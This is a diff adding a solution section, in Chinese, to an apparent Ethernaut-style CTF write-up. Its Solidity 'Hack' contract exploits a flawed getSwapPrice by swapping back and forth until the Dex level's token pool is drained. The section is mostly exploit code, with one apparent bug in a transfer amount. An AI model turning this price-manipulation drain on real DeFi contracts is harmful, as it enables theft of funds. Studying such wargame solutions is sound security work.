@@ -367,3 +367,45 @@ contract Hack {
     }
 }
 ```
+
+## 23. Dex
+
+Dex合约的getSwapPrice函数计算Token价格有误, 可以通过来回交换代币来消耗dex合约的代币
+
+```solidity
+contract Hack {
+    Dex d = Dex(0x198687D61b5c42c820c5C411bD2d6D6b9d8D0556);
+    address[2] tokens = [d.token1(), d.token2()];
+    constructor() {
+        // 转移代币到hack合约
+        SwappableToken(tokens[0]).approve(msg.sender, address(this), type(uint256).max);
+        SwappableToken(tokens[1]).approve(msg.sender, address(this), type(uint256).max);
+        IERC20(tokens[0]).transferFrom(msg.sender, address(this), IERC20(tokens[0]).balanceOf(msg.sender));
+        IERC20(tokens[1]).transferFrom(msg.sender, address(this), IERC20(tokens[0]).balanceOf(msg.sender));
+        d.approve(address(d), type(uint256).max);
+    }
+    function hack() public {
+        uint256[2] memory hackBalances;
+        uint256[2] memory dexBalances;
+        uint fromIndex = 0;
+        uint toIndex = 1;
+        while (true) {
+            hackBalances = [SwappableToken(tokens[fromIndex]).balanceOf(address(this)),
+                                    SwappableToken(tokens[toIndex]).balanceOf(address(this))];
+
+            dexBalances = [SwappableToken(tokens[fromIndex]).balanceOf(address(d)),
+                                    SwappableToken(tokens[toIndex]).balanceOf(address(d))];
+
+            uint256 swapAmount = d.getSwapPrice(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
+            if (swapAmount > dexBalances[toIndex]) {
+                d.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
+                break;
+            } else {
+                d.swap(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
+            }
+            fromIndex = 1 - fromIndex;
+            toIndex = 1 - toIndex;
+        }
+    }
+}
+```
